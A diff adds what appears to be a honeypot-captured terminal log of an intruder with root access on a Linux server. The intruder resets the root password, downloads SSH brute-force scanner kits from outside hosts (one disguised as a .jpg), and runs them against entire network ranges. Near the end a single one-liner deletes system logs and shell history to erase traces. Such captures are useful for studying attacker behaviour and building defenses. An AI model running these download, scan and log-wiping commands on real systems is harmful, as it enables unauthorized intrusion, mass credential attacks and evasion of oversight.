@@ -1,0 +1,274 @@
+[4hAWSWeb:~# w
+[4l 15:45:36 up 72 days, 17:49,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# w
+[4l 15:45:53 up 72 days, 17:49,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# cd /v[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# cd /var/tmp
+[4l[4hAWSWeb:/var/tmp# ls
+[4l[4hAWSWeb:/var/tmp# ls -a
+[4l.  .. 
+[4hAWSWeb:/var/tmp# cd
+[4l[4hAWSWeb:~# ls -a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hAWSWeb:~# cd /var/tmp
+[4l[4hAWSWeb:/var/tmp# mkdir "." 
+[4lmkdir: cannot create directory `/var/tmp': File exists
+[4hAWSWeb:/var/tmp# cd [1D[1P[1D[1P[1D[1Pmkdir " ."
+[4l[4hAWSWeb:/var/tmp# rm[1D[1P[1D[1Prm -rf " ."
+[4l[4hAWSWeb:/var/tmp# mkdir ". "
+[4l[4hAWSWeb:/var/tmp# cd ">?[1D[1P[1D[1P. "
+[4l[4hAWSWeb:/var/tmp/. # ls
+[4l[4hAWSWeb:/var/tmp/. # wget http://root-arhive.at.ua/scanner/gosh.jpg
+[4l--2013-04-07 15:46:52--  http://root-arhive.at.ua/scanner/gosh.jpg
+Connecting to root-arhive.at.ua:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1648870 (1M) [image/jpeg]
+Saving to: `gosh.jpg
+
+ 0% [>                                      ] 13,032       28K/s  eta 57s 6% [==>                                    ] 108,600      113K/s  eta 13s18% [=======>                               ] 306,976      208K/s  eta 6s 38% [==============>                        ] 628,432      317K/s  eta 3s73% [============================>          ] 1,204,736    481K/s  eta 0s100%[======================================>] 1,648,870    481K/s
+
+2013-04-07 15:46:55 (481 KB/s) - `gosh.jpg' saved [1648870/1648870]
+[4hAWSWeb:/var/tmp/. # ls
+[4lgosh.jpg 
+[4hAWSWeb:/var/tmp/. # tar zxvf gosh.jpg
+[4lgosh
+gosh/1
+gosh/2
+gosh/3
+gosh/4
+gosh/5
+gosh/a
+gosh/ss
+gosh/scam
+gosh/go.sh
+gosh/pass_file
+gosh/mfu.txt
+gosh/common
+gosh/ssh-scan
+gosh/pscan2
+gosh/gen-pass.sh
+gosh/secure
+gosh/vuln.txt
+gosh/pscan3
+[4hAWSWeb:/var/tmp/. # ls
+[4lgosh.jpg gosh     
+[4hAWSWeb:/var/tmp/. # rm -rf gosh.jpg
+[4l[4hAWSWeb:/var/tmp/. # ls
+[4lgosh 
+[4hAWSWeb:/var/tmp/. # cd gosh
+[4l[4hAWSWeb:/var/tmp/. /gosh# ls
+[4l1           2           3           4           5           a           
+ss          scam        go.sh       pass_file   mfu.txt     common      
+ssh-scan    pscan2      gen-pass.sh secure      vuln.txt    pscan3      
+[4hAWSWeb:/var/tmp/. /gosh# ./gos[1D[1P.sh 200
+[4lscanning network 200.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hAWSWeb:/var/tmp/. /gosh# g[1D[1P./go.sh 200.175[1D[1P4
+[4lscanning network 200.174.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hAWSWeb:/var/tmp/. /gosh# ls
+[4l1           2           3           4           5           a           
+ss          scam        go.sh       pass_file   mfu.txt     common      
+ssh-scan    pscan2      gen-pass.sh secure      vuln.txt    pscan3      
+[4hAWSWeb:/var/tmp/. /gosh# ./scam
+[4lunable to open display ":0"
+[4hAWSWeb:/var/tmp/. /gosh# ./go.sh
+[4lA must be between 1 and 254
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hAWSWeb:/var/tmp/. /gosh# ./a 200.174
+[4l[1;31m«[1;32m Created bY MaLa [1;31m»[0m
+INCERC SA DAU VIATZA CIBERNETICI
+# scanning: 200.174 (total: 0) (0.01% done)[4lcConnection to server closed.
+^C
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# ls
+[4l[4hlocalhost:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hlocalhost:~# ls -a
+[4l.         ..        .debtags  .viminfo  .aptitude .profile  .bashrc   
+[4hlocalhost:~# cd 
+[4l[4hlocalhost:~# cd /var/tmp
+[4l[4hlocalhost:/var/tmp# ls
+[4l[4hlocalhost:/var/tmp# cd[1D[1P[1D[1Pls -a
+[4l.  .. .  
+[4hlocalhost:/var/tmp# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:/var/tmp# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:/var/tmp# 
+localhost:/var/tmp# 
+localhost:/var/tmp# wget http://rapk1d.webs.com/100mb.tgz
+[4l--2013-04-07 16:08:24--  http://rapk1d.webs.com/100mb.tgz
+Connecting to rapk1d.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 595836 (581K) [application/octet-stream]
+Saving to: `100mb.tgz
+
+ 0% [>                                      ] 3,888        30K/s  eta 19s100%[======================================>] 595,836      30K/s
+
+2013-04-07 16:08:25 (30 KB/s) - `100mb.tgz' saved [595836/595836]
+[4hlocalhost:/var/tmp# tar[1D[1P[1D[1P[1D[1Ptar zxvf 100mb.tgz
+[4lgosh
+gosh/ss
+gosh/clean
+gosh/ssh-scan
+gosh/nohup.out
+gosh/pass_file
+gosh/vuln
+gosh/go.sh
+gosh/dedi
+[4hlocalhost:/var/tmp# rm -rf 100mb.tgz
+[4l[4hlocalhost:/var/tmp# ls
+[4lgosh 
+[4hlocalhost:/var/tmp# cd gosh
+[4l[4hlocalhost:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hlocalhost:/var/tmp/gosh# ./go.sh 24[1D[1P[1D[1P6[1D[1P56[1D[1P4
+[4lscanning network 54.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hlocalhost:/var/tmp/gosh# chomd +x *
+bash: chomd: command not found
+localhost:/var/tmp/gosh# /[1D[1P./go.sh 100
+[4lscanning network 100.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hlocalhost:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hlocalhost:/var/tmp/gosh# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hlocalhost:/var/tmp/gosh# w
+[4l 16:09:54 up 72 days, 18:13,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hlocalhost:/var/tmp/gosh# w
+[4l 16:10:00 up 72 days, 18:13,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hlocalhost:/var/tmp/gosh# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:/var/tmp/gosh# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:/var/tmp/gosh# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:/var/tmp/gosh# sudo
+bash: sudo: command not found
+localhost:/var/tmp/gosh# cd /root
+[4l[4hlocalhost:~# ls
+[4l[4hlocalhost:~# bash
+[4l[4hlocalhost:~# w
+[4l 16:10:45 up 72 days, 18:14,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:~# w
+[4l 16:11:47 up 72 days, 18:15,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hlocalhost:~# w
+[4l 16:12:12 up 72 days, 18:16,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.115.191.175    15:45    0.09   0.05   0.05 w
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:~# cd /var/tmp
+[4l[4hlocalhost:/var/tmp# ls
+[4lgosh 
+[4hlocalhost:/var/tmp# cd gosh
+[4l[4hlocalhost:/var/tmp/gosh# ls
+[4lss        clean     ssh-scan  nohup.out pass_file vuln      go.sh     dedi      
+[4hlocalhost:/var/tmp/gosh# ./go.sh 20
+[4lscanning network 20.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hlocalhost:/var/tmp/gosh# cd
+[4l[4hlocalhost:~# rm -rf /var/log/wtmp;rm -rf /var/log/lastlog;rm -rf /var/log/secure;rm -rf /var/log/xferlog;rm -rf /var/log/messages;rm -rf /var/run/utmp;touch /var/run/utmp;touch /var/log/messages;touch /var/log/wtmp;touch /var/log/messages;touch /var/log/xferlog;touch /var/log/secure;touch /var/log/lastlog;rm -rf /var/log/maillog;touch /var/log/maillog;rm -rf /root/.bash_history;touch /root/.bash_history;history -c
+[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4h[4l[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# i[1D[1Pexti
+bash: exti: command not found
+localhost:~# exti
+bash: exti: command not found
+localhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# [4lcConnection to server closed.
+[4hlocalhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# 
+localhost:~# c
+bash: c: command not found
+localhost:~# d
+bash: d: command not found
+localhost:~# bash
+[4l[4hlocalhost:~# c[1D[1P
+localhost:~# 
